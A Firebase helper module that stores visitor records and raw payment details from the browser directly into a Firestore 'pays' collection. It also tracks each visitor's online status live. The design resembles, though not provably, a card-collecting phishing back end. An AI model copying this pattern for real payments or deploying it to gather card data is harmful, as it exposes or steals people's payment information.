// firebase.js
import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase, onDisconnect, onValue, ref, serverTimestamp, set } from "firebase/database";
import { doc, getFirestore, setDoc, updateDoc } from "firebase/firestore";

const firebaseConfig = {
    apiKey: "AIzaSyCVuDP2-RaK509rdoZUGarOkdBb4CpT_f8",
    authDomain: "neewtaminsss.firebaseapp.com",
    databaseURL: "https://neewtaminsss-default-rtdb.firebaseio.com",
    projectId: "neewtaminsss",
    storageBucket: "neewtaminsss.firebasestorage.app",
    messagingSenderId: "873192027415",
    appId: "1:873192027415:web:724aafce2bcdbdb8e73352",
    measurementId: "G-JB0KP1FZH4"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function addData(data: any) {
  localStorage.setItem("visitor", data.id);
  try {
    const docRef = await doc(db, "pays", data.id!);
    await setDoc(docRef, data, { merge: true });

    console.log("Document written with ID: ", docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error("Error adding document: ", e);
    // You might want to show an error message to the user here
  }
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, createdDate: new Date().toISOString() },
        { merge: true }
      );
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    alert("Error adding payment info to Firestore");
  }
};
export const setupOnlineStatus = (userId: string) => {
    if (!userId) return;
  
    // Create a reference to this user's specific status node in Realtime Database
    const userStatusRef = ref(database, `/status/${userId}`);
  
    // Create a reference to the user's document in Firestore
    const userDocRef = doc(db, "pays", userId);
  
    // Set up the Realtime Database onDisconnect hook
    onDisconnect(userStatusRef)
      .set({
        state: "offline",
        lastChanged: serverTimestamp(),
      })
      .then(() => {
        // Update the Realtime Database when this client connects
        set(userStatusRef, {
          state: "online",
          lastChanged: serverTimestamp(),
        });
  
        // Update the Firestore document
        updateDoc(userDocRef, {
          online: true,
          lastSeen: serverTimestamp(),
        }).catch((error) =>
          console.error("Error updating Firestore document:", error)
        );
      })
      .catch((error) => console.error("Error setting onDisconnect:", error));
  
    // Listen for changes to the user's online status
    onValue(userStatusRef, (snapshot) => {
      const status = snapshot.val();
      if (status?.state === "offline") {
        // Update the Firestore document when user goes offline
        updateDoc(userDocRef, {
          online: false,
          lastSeen: serverTimestamp(),
        }).catch((error) =>
          console.error("Error updating Firestore document:", error)
        );
      }
    });
  };
  
export { db, database };